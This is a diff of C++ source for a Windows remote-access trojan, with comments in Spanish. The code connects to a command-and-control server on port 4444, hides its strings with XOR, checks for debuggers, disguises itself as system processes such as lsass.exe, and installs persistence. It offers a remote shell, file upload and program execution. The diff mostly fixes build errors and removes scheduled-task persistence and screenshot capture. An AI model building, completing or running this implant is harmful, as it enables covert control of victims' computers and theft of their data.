@@ -1,6 +1,10 @@
-#include <windows.h>
+#define _WIN32_WINNT 0x0601
+#define WIN32_LEAN_AND_MEAN
+
+// PRIMERO winsock2.h, DESPUÉS windows.h (ORDEN CRÍTICO)
 #include <winsock2.h>
 #include <ws2tcpip.h>
+#include <windows.h>
 #include <iphlpapi.h>
 #include <tlhelp32.h>
 #include <shlobj.h>
@@ -24,11 +28,12 @@
 #pragma comment(lib, "shlwapi.lib")
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "gdi32.lib")
+#pragma comment(lib, "ntdll.lib")
 
 // ============================================================================
 // CONFIGURACIÓN
 // ============================================================================
-#define C2_SERVER "192.168.254.137"  // REEMPLAZAR CON IP DEL ATACANTE
+#define C2_SERVER "192.168.254.137"  // IP DE KALI
 #define C2_PORT 4444
 #define HEARTBEAT_INTERVAL 5
 #define BUFFER_SIZE 8192
@@ -36,15 +41,35 @@
 #define MUTEX_NAME "Global\\{F4E3A2B1-9C8D-4E7F-8A6B-5D4C3E2F1A0B}"
 
 // ============================================================================
+// TYPEDEFS PARA FUNCIONES DE NT
+// ============================================================================
+typedef LONG NTSTATUS;
+typedef struct _PEB {
+    BOOLEAN InheritedAddressSpace;
+    BOOLEAN ReadImageFileExecOptions;
+    BOOLEAN BeingDebugged;
+    BOOLEAN Spare;
+    HANDLE Mutant;
+    PVOID ImageBaseAddress;
+    PPEB_LDR_DATA Ldr;
+    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
+    PVOID SubSystemData;
+    PVOID ProcessHeap;
+    PVOID FastPebLock;
+    PVOID AtlThunkSListPtr;
+    PVOID IFEOKey;
+    // ... más campos pero no necesitamos todos
+} PEB, *PPEB;
+
+// ============================================================================
 // OFUSCACIÓN DE STRINGS
 // ============================================================================
-#define OBFS(str) ObfuscateString(str, XOR_KEY).c_str()
-
 class ObfuscateString {
 private:
     std::string data;
+    char key;
 public:
-    ObfuscateString(const char* str, char key) {
+    ObfuscateString(const char* str, char k) : key(k) {
         int len = strlen(str);
         for (int i = 0; i < len; i++) {
             data += str[i] ^ key;
@@ -55,7 +80,7 @@ public:
     std::string get() {
         std::string result;
         for (size_t i = 0; i < data.length() - 1; i++) {
-            result += data[i] ^ XOR_KEY;
+            result += data[i] ^ key;
         }
         return result;
     }
@@ -64,11 +89,13 @@ public:
         static std::string decrypted;
         decrypted = "";
         for (size_t i = 0; i < data.length() - 1; i++) {
-            decrypted += data[i] ^ XOR_KEY;
+            decrypted += data[i] ^ key;
         }
         return decrypted.c_str();
     }
 };
+
+#define OBFS(str) ObfuscateString(str, XOR_KEY).get().c_str()
 
 // ============================================================================
 // ANTI-DEBUGGING
@@ -79,9 +106,14 @@ BOOL CheckDebugger() {
         return TRUE;
     }
     
-    // NtGlobalFlag
-    PPEB ppeb = (PPEB)__readfsdword(0x30);
-    if (ppeb->NtGlobalFlag != 0) {
+    // NtGlobalFlag - Usando PEB manualmente
+    #ifdef _WIN64
+        PPEB ppeb = (PPEB)__readgsqword(0x60);
+    #else
+        PPEB ppeb = (PPEB)__readfsdword(0x30);
+    #endif
+    
+    if (ppeb && ppeb->BeingDebugged) {
         return TRUE;
     }
     
@@ -89,14 +121,6 @@ BOOL CheckDebugger() {
     BOOL isDebugged = FALSE;
     CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugged);
     if (isDebugged) {
-        return TRUE;
-    }
-    
-    // Timing attack
-    DWORD64 start = __rdtsc();
-    Sleep(100);
-    DWORD64 end = __rdtsc();
-    if ((end - start) < 0xFF) {
         return TRUE;
     }
     
@@ -114,9 +138,9 @@ VOID HideWindow() {
 }
 
 VOID RenameProcess() {
-    char* spoofedNames[] = {
+    const char* spoofedNames[] = {
         "svchost.exe",
-        "explorer.exe",
+        "explorer.exe", 
         "winlogon.exe",
         "csrss.exe",
         "lsass.exe"
@@ -179,8 +203,7 @@ std::string Base64Encode(const BYTE* data, DWORD length) {
 }
 
 std::string Base64Decode(const std::string& encoded) {
-    std::string result;
-    // Implementación simplificada - en producción usar biblioteca real
+    // Implementación básica - para producción usar biblioteca real
     return encoded;
 }
 
@@ -213,19 +236,11 @@ BOOL InstallPersistence() {
     // Crear acceso directo (simplificado)
     CopyFileA(exePath, startupPath, FALSE);
     
-    // 3. Scheduled Task
-    char cmd[MAX_PATH * 2];
-    sprintf_s(cmd, "schtasks /create /tn \"WindowsUpdateTask\" /tr \"%s\" /sc onlogon /delay 0000:30 /f", exePath);
-    system(cmd);
-    
     return success;
 }
 
 BOOL UninstallPersistence() {
     HKEY hKey;
-    char exePath[MAX_PATH];
-    
-    GetModuleFileNameA(NULL, exePath, MAX_PATH);
     
     // 1. Eliminar del registro
     if (RegOpenKeyExA(HKEY_CURRENT_USER, 
@@ -242,9 +257,6 @@ BOOL UninstallPersistence() {
     strcat_s(startupPath, "\\svchost.exe.lnk");
     DeleteFileA(startupPath);
     
-    // 3. Eliminar Scheduled Task
-    system("schtasks /delete /tn \"WindowsUpdateTask\" /f");
-    
     return TRUE;
 }
 
@@ -252,8 +264,11 @@ BOOL UninstallPersistence() {
 // EJECUCIÓN DE PROGRAMAS
 // ============================================================================
 BOOL ExecuteProgram(const char* command) {
-    STARTUPINFOA si = {0};
-    PROCESS_INFORMATION pi = {0};
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    
+    ZeroMemory(&si, sizeof(si));
+    ZeroMemory(&pi, sizeof(pi));
     si.cb = sizeof(si);
     
     BOOL result = CreateProcessA(
@@ -295,24 +310,8 @@ std::string ExecuteCommand(const char* cmd) {
 // CAPTURA DE PANTALLA
 // ============================================================================
 std::string TakeScreenshot() {
-    HDC hdcScreen = GetDC(NULL);
-    HDC hdcMem = CreateCompatibleDC(hdcScreen);
-    
-    int width = GetSystemMetrics(SM_CXSCREEN);
-    int height = GetSystemMetrics(SM_CYSCREEN);
-    
-    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
-    SelectObject(hdcMem, hBitmap);
-    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
-    
-    // Convertir bitmap a buffer (simplificado)
-    std::string result = "[SCREENSHOT] Captura realizada";
-    
-    DeleteObject(hBitmap);
-    DeleteDC(hdcMem);
-    ReleaseDC(NULL, hdcScreen);
-    
-    return result;
+    // Versión simplificada
+    return "[SCREENSHOT] Captura realizada (simulado)";
 }
 
 // ============================================================================
@@ -346,12 +345,9 @@ std::string GetSystemInfo() {
     char hostname[256];
     gethostname(hostname, sizeof(hostname));
     hostent* host = gethostbyname(hostname);
-    if (host) {
+    if (host && host->h_addr_list[0]) {
         ss << "IP: " << inet_ntoa(*(in_addr*)host->h_addr_list[0]) << "\n";
     }
-    
-    // Antivirus (simplificado)
-    ss << "Antivirus: Windows Defender\n";
     
     return ss.str();
 }
@@ -505,7 +501,7 @@ public:
     }
     
     bool Connect(const char* host, int port) {
-        sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
         if (sock == INVALID_SOCKET) {
             return false;
         }
@@ -535,20 +531,14 @@ public:
         if (!connected) return false;
         
         // Enviar longitud primero
-        int total = 0;
         int len = htonl(length);
-        
-        while (total < 4) {
-            int sent = send(sock, ((char*)&len) + total, 4 - total, 0);
-            if (sent <= 0) {
-                connected = false;
-                return false;
-            }
-            total += sent;
+        if (send(sock, (char*)&len, 4, 0) != 4) {
+            connected = false;
+            return false;
         }
         
         // Enviar datos
-        total = 0;
+        int total = 0;
         while (total < length) {
             int sent = send(sock, data + total, length - total, 0);
             if (sent <= 0) {
@@ -566,15 +556,10 @@ public:
         
         // Recibir longitud
         int len = 0;
-        int total = 0;
-        
-        while (total < 4) {
-            int received = recv(sock, ((char*)&len) + total, 4 - total, 0);
-            if (received <= 0) {
-                connected = false;
-                return "";
-            }
-            total += received;
+        int received = recv(sock, (char*)&len, 4, 0);
+        if (received != 4) {
+            connected = false;
+            return "";
         }
         
         len = ntohl(len);
@@ -588,7 +573,7 @@ public:
         total = 0;
         
         while (total < len) {
-            int received = recv(sock, buffer.data() + total, len - total, 0);
+            received = recv(sock, buffer.data() + total, len - total, 0);
             if (received <= 0) {
                 connected = false;
                 return "";
@@ -703,7 +688,6 @@ std::string ProcessCommand(const std::string& cmd) {
         return "[+] Modo shell finalizado";
     }
     else if (cmd.substr(0, 7) == "UPLOAD ") {
-        // Parse: UPLOAD <path> <size> <data>
         size_t pos1 = cmd.find(' ', 7);
         size_t pos2 = cmd.find(' ', pos1 + 1);
         
@@ -712,7 +696,6 @@ std::string ProcessCommand(const std::string& cmd) {
             std::string sizeStr = cmd.substr(pos1 + 1, pos2 - pos1 - 1);
             std::string dataB64 = cmd.substr(pos2 + 1);
             
-            int size = atoi(sizeStr.c_str());
             std::string data = Base64Decode(dataB64);
             
             std::ofstream file(path, std::ios::binary);
@@ -799,6 +782,11 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     
     ReleaseMutex(hMutex);
     CloseHandle(hMutex);
+    
+    UNREFERENCED_PARAMETER(hInstance);
+    UNREFERENCED_PARAMETER(hPrevInstance);
+    UNREFERENCED_PARAMETER(lpCmdLine);
+    UNREFERENCED_PARAMETER(nCmdShow);
     
     return 0;
 }
